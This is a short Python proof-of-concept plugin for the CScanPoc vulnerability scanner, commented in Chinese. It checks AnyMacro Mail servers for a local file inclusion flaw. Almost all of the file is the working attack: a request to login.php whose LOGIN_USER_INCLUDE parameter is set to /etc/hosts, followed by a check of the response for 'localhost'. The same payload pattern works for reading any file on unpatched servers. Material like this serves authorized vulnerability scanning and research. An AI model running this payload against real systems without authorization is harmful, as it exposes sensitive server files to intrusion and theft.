# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'AnyMacro_0000' # 平台漏洞编号
    name = 'AnyMacro Mail邮件系统存在文件包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2015-12-17'  # 漏洞公布时间
    desc = '''
        AnyMacro Mail邮件系统存在文件包含，可任意读取敏感信息。
    ''' # 漏洞描述
    ref = 'Unknown' #https://wooyun.shuimugan.com/bug/view?bug_no=153123
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'AnyMacro Mail邮件系统'  # 漏洞组件名称
    product_version = '应用版本'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ad085427-2d39-4bf4-88f2-4bc1e8f2ba7c' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/login.php?LOGIN_USER_INCLUDE=/etc/hosts'
            response = requests.get(vul_url)
            if response.status_code ==200 and 'localhost' in response.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
